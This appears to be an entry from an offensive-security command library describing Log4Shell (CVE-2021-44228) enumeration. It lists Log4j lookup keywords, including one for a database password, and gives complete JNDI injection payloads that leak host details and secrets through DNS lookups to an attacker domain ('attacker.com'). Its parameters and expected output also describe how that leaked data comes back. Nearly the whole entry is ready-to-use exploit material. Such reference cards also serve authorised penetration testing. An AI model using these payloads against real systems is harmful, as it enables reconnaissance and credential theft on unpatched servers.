---
type: command
executor: injection
data: |-
  java:os
  java:os:version
  docker:containerId
  web:rootDir
  web:server
  bundle:config:db.password
output: null
platforms:
  - Java
  - Web
tags:
  - log4shell
  - enumeration
verified: true
validated: true
---

# log4shell-jndi-lookup-environment-variables

## Command

```injection
java:os
java:os:version
docker:containerId
web:rootDir
web:server
bundle:config:db.password
```

## Description

This set of Java property keywords is used to construct JNDI payloads for enumerating environment details like OS, container info, web paths, and config values in Log4Shell exploitation. Combine with base JNDI syntax (e.g., ${jndi:ldap://${KEYWORD}.domain/a}) to leak data via remote lookups.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_KEYWORD | Specific property to query (e.g., java:os) | Yes |
| $_DOMAIN | Attacker domain for resolution | Yes |

## Examples

### Basic Usage

Full payload for OS:
```injection
${jndi:ldap://${java:os}.attacker.com/a}
```

### Advanced Usage

Probe web server:
```injection
${jndi:ldap://${web:server}.attacker.com/a}
```

## Expected Output

DNS queries like 'Linux.attacker.com' or '/var/www.attacker.com'. Sensitive leaks (e.g., db.password) may appear in resolutions if unredacted.

## Related

- [[procedures/Enumerate-Information-via-Log4Shell-JNDI-Lookups]]
- [[commands/log4shell-jndi-lookup-java-version-hostname]]
